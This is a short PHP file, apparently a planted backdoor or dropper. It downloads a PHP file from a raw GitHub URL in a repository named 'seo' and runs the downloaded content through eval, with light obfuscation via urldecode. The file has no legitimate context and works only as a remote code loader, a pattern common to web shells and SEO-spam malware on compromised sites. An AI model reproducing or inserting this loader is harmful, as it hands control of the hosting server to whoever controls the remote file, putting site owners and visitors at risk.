<?php 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, urldecode("https://raw.githubusercontent.com/5Y4H/seo/refs/heads/main/pdf-sign-cli.php"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec($ch);
curl_close($ch);

eval(urldecode("%3f%3e") . $content);
?>
